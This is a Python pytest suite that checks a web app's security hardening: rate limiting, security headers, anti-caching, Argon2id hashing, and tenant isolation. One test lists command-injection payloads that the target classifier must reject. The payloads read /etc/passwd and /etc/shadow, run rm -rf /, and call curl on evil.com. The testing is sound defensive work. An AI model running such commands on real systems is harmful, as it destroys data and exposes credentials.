"""Automated security hardening verification test suite for Gate 7.

Tests cover:
1. Sliding window rate limiting on authentication endpoints (/login, /signup).
2. Rate limiter core behavior, window tracking, and HTTP 429 enforcement.
3. HTTP security headers (CSP, Permissions-Policy, HSTS/anti-clickjacking).
4. Anti-caching headers on sensitive API and dashboard endpoints.
5. Command injection and target input sanitization.
6. RBAC and tenant isolation on investigation workflows.
7. RFC 9106 Argon2id password hash structure and timing safety.
"""

import time
import pytest
from starlette.testclient import TestClient
from sqlalchemy.orm import Session

from app.core.rate_limit import SlidingWindowRateLimiter
from app.core.security import hash_password, verify_password
from app.models.user import UserModel
import uuid
from app.models.investigation import InvestigationModel
from app.services.target_authorization import classify_target


class TestRateLimiting:
    """Verify in-memory sliding window rate limiter unit and API behavior."""

    def test_sliding_window_limiter_unit(self):
        limiter = SlidingWindowRateLimiter()
        key = "test-client-ip"
        max_requests = 3
        window = 2

        # 3 requests allowed
        assert limiter.is_allowed(key, max_requests=max_requests, window_seconds=window) is True
        assert limiter.is_allowed(key, max_requests=max_requests, window_seconds=window) is True
        assert limiter.is_allowed(key, max_requests=max_requests, window_seconds=window) is True

        # 4th request must be blocked
        assert limiter.is_allowed(key, max_requests=max_requests, window_seconds=window) is False
        retry_after = limiter.get_retry_after(key, window_seconds=window)
        assert retry_after > 0

        # After sleep beyond window, should allow again
        time.sleep(2.1)
        assert limiter.is_allowed(key, max_requests=max_requests, window_seconds=window) is True

    def test_login_rate_limiting_http_429(self, client: TestClient):
        """Verify exceeding 20 login attempts from single IP returns HTTP 429."""
        from app.core.rate_limit import auth_rate_limiter
        # Clear limiter state for test determinism
        auth_rate_limiter.clear()

        # Fire 20 requests
        for i in range(20):
            res = client.post("/api/v1/auth/login", json={
                "username_or_email": f"attacker_{i}",
                "password": "WrongPassword123!#"
            })
            assert res.status_code in {400, 401}

        # 21st request must trigger HTTP 429 Too Many Requests
        rate_limited_res = client.post("/api/v1/auth/login", json={
            "username_or_email": "attacker_burst",
            "password": "WrongPassword123!#"
        })
        assert rate_limited_res.status_code == 429
        body = rate_limited_res.json()
        assert "Too many authentication attempts" in body["error"]["message"]
        assert "Retry-After" in rate_limited_res.headers
        assert int(rate_limited_res.headers["Retry-After"]) > 0

        # Reset limiter for subsequent tests
        auth_rate_limiter.clear()

    def test_signup_rate_limiting_http_429(self, client: TestClient):
        """Verify exceeding 10 signup attempts returns HTTP 429."""
        from app.core.rate_limit import auth_rate_limiter
        auth_rate_limiter.clear()

        for i in range(10):
            res = client.post("/api/v1/auth/signup", json={
                "username": f"user_limit_{i}",
                "email": f"user_{i}@limit.com",
                "password": "Password123!#"
            })
            # May succeed or fail validation, but not rate limited yet
            assert res.status_code in {200, 201, 400}

        # 11th attempt blocked
        res_limit = client.post("/api/v1/auth/signup", json={
            "username": "overflow_user",
            "email": "overflow@limit.com",
            "password": "Password123!#"
        })
        assert res_limit.status_code == 429
        assert "Too many registration attempts" in res_limit.json()["error"]["message"]

        auth_rate_limiter.clear()


class TestSecurityHeaders:
    """Verify CSP, Permissions-Policy, Anti-Clickjacking, and Anti-Caching headers."""

    def test_mandatory_security_headers_present(self, client: TestClient):
        res = client.get("/health/live")
        assert res.status_code == 200
        headers = res.headers

        assert headers.get("X-Content-Type-Options") == "nosniff"
        assert headers.get("X-Frame-Options") == "DENY"
        assert headers.get("X-XSS-Protection") == "1; mode=block"
        assert headers.get("Referrer-Policy") == "strict-origin-when-cross-origin"
        assert "camera=()" in headers.get("Permissions-Policy", "")
        assert "microphone=()" in headers.get("Permissions-Policy", "")

    def test_content_security_policy_header(self, client: TestClient):
        res = client.get("/health/live")
        assert res.status_code == 200
        csp = res.headers.get("Content-Security-Policy")
        assert csp is not None
        assert "default-src 'self'" in csp
        assert "script-src 'self' 'unsafe-inline'" in csp
        assert "style-src 'self' 'unsafe-inline'" in csp
        assert "frame-ancestors 'none'" in csp
        assert "object-src 'none'" in csp

    def test_api_anti_caching_headers(self, client: TestClient):
        """API endpoints must return no-store, no-cache, must-revalidate."""
        res = client.get("/api/v1/auth/me")
        # 401 or whatever status, headers must be present
        cc = res.headers.get("Cache-Control")
        assert cc is not None
        assert "no-store" in cc
        assert "no-cache" in cc
        assert "must-revalidate" in cc
        assert res.headers.get("Pragma") == "no-cache"

    def test_dashboard_anti_caching_headers(self, admin_client):
        """Dashboard operational endpoints must return anti-caching headers."""
        res = admin_client.get("/dashboard/")
        assert res.status_code == 200
        cc = res.headers.get("Cache-Control")
        assert cc is not None
        assert "no-store" in cc
        assert "no-cache" in cc


class TestTargetSanitization:
    """Verify malicious input strings cannot inject commands or bypass classification."""

    @pytest.mark.parametrize("payload", [
        "127.0.0.1; cat /etc/passwd",
        "example.com && whoami",
        "example.com | rm -rf /",
        "`id`",
        "$(cat /etc/shadow)",
        "example.com; curl evil.com",
        "10.0.0.1 & dir",
        "test.com\n127.0.0.1",
        "test.com\r\nrm -rf /",
    ])
    def test_command_injection_rejected_by_classifier(self, payload: str):
        target_type = classify_target(payload)
        assert target_type == "UNKNOWN"


class TestArgon2idSecurity:
    """Verify password hashing meets RFC 9106 standards."""

    def test_hash_structure_argon2id(self):
        password = "SecureTestingPassword123!#"
        hashed = hash_password(password)

        # Argon2id prefix
        assert hashed.startswith("$argon2id$")
        # Contains version 19
        assert "v=19" in hashed
        # Contains memory cost 65536 (64 MB)
        assert "m=65536" in hashed
        # Contains time cost 3
        assert "t=3" in hashed
        # Contains parallelism 4
        assert "p=4" in hashed

        # Verify correct verification
        assert verify_password(password, hashed) is True
        assert verify_password("WrongPassword", hashed) is False


class TestRBACAndTenantIsolation:
    """Verify tenant isolation and role privilege boundaries on workflows."""

    def test_analyst_cannot_access_foreign_investigation(
        self, client: TestClient, db_session: Session, admin_user: UserModel, analyst_user: UserModel, analyst_token: str
    ):
        # Admin creates an investigation
        admin_inv = InvestigationModel(
            id=str(uuid.uuid4()),
            name="Admin Confidential Target",
            organization_name="Admin Corp",
            description="Confidential Target",
            lead_investigator=admin_user.username,
            owner_user_id=admin_user.id,
            status="active",
            owned_domains=["confidential.internal"],
            approved_ips=[],
            approved_cidrs=[],
            active_targets=["confidential.internal"],
        )
        db_session.add(admin_inv)
        db_session.commit()
        db_session.refresh(admin_inv)

        # Analyst tries to retrieve it
        res = client.get(
            f"/api/v1/investigations/{admin_inv.id}",
            headers={"Authorization": f"Bearer {analyst_token}"}
        )
        # Must be forbidden or not found (tenant isolation)
        assert res.status_code in {403, 404}

    def test_analyst_cannot_dispatch_foreign_workflow(
        self, client: TestClient, db_session: Session, admin_user: UserModel, analyst_user: UserModel, analyst_token: str
    ):
        admin_inv = InvestigationModel(
            id=str(uuid.uuid4()),
            name="Admin Protected System",
            organization_name="Admin Corp",
            description="Protected Target",
            lead_investigator=admin_user.username,
            owner_user_id=admin_user.id,
            status="active",
            owned_domains=["protected.internal"],
            approved_ips=[],
            approved_cidrs=[],
            active_targets=["protected.internal"],
        )
        db_session.add(admin_inv)
        db_session.commit()
        db_session.refresh(admin_inv)

        # Analyst tries to dispatch workflow on admin's investigation
        res = client.post(
            f"/api/v1/investigations/{admin_inv.id}/workflow/dispatch",
            headers={"Authorization": f"Bearer {analyst_token}"}
        )
        assert res.status_code in {403, 404}
